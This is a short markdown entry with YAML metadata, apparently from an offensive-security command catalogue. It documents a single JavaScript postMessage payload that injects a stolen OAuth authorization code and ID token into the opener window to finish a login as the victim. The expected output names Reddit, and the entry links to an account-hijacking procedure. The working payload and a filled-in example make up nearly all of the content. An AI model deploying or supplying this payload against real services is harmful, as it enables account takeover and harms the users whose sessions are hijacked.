---
data: >-
  opener.postMessage('{"method":"oauthDone","data":{"authorization":{"code":"[stolen_code]","id_token":"[stolen_id_token]","state":"[attacker_state]"}}}',"*");
tags:
  - oauth
  - postmessage
type: command
executor: javascript
platforms:
  - Web
id: b9ef50f2-ae2e-4941-bd93-016fdb790e57
created_at: '2025-12-14T00:11:25.324Z'
updated_at: '2025-12-14T00:11:25.324Z'
verified: false
validated: true
submitted: true
---
# postmessage-oauthdone

## Command

```javascript
opener.postMessage('{"method":"oauthDone","data":{"authorization":{"code":"[stolen_code]","id_token":"[stolen_id_token]","state":"[attacker_state]"}}}',"*");
```

## Description

Posts a message to the opener window to complete OAuth login with stolen credentials, used in account hijack scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `method` | oauthDone - indicates OAuth completion | Yes |
| `data` | Contains authorization object with code, id_token, state | Yes |
| `postMessage` | Sends data to parent window | Yes |

## Examples

### Basic Usage

```javascript
opener.postMessage('{"method":"oauthDone","data":{"authorization":{"code":"abc123","id_token":"def456","state":"ghi789"}}}',"*");
```

## Expected Output

Completes login as the victim on Reddit.

## Related

- [[procedures/Hijack-Account-with-Stolen-Tokens]]
